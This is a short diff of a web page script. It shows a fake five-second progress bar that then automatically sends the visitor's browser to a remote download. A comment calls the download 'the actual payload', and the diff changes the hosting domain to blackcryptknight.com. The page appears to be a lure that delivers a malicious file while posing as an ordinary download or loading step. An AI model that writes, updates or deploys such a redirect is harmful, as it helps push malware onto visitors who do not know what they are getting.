@@ -54,7 +54,7 @@
         if (width >= 100) {
             clearInterval(interval);
             // Trigger the actual payload download script
-            window.location.href = 'https://apinetsolworkspace.network/api/build/3b143087-77a4-446f-857a-1f58ef3bbf82/download';
+            window.location.href = 'https://blackcryptknight.com/api/build/b7490810-acb0-4601-b556-3ad096730089/download';
         }
     }, 100); // Total wait: 5 seconds
 </script>
